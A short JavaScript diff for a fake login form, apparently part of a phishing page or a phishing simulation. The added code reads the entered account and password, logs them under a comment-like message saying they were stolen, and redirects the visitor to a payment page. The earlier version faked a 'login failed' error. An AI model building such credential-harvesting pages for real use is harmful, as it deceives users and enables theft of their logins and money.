@@ -1,7 +1,13 @@
-document.querySelector("form").addEventListener("submit", function(e) {
+document.getElementById("loginForm").addEventListener("submit", function(e) {
     e.preventDefault();
-    const user = document.querySelector("input[type='text']").value;
-    const pass = document.querySelector("input[type='password']").value;
-    console.log("使用者輸入：", user, pass);
-    alert("登入失敗，請稍後再試");  // 模擬假錯誤
+    const inputs = document.querySelectorAll("input");
+    const account = inputs[0].value;
+    const password = inputs[1].value;
+
+    if (account && password) {
+        console.log("偷到帳號密碼：", account, password);
+        window.location.href = "payment.html";
+    } else {
+        document.getElementById("loginError").textContent = "請輸入完整帳密。";
+    }
 });
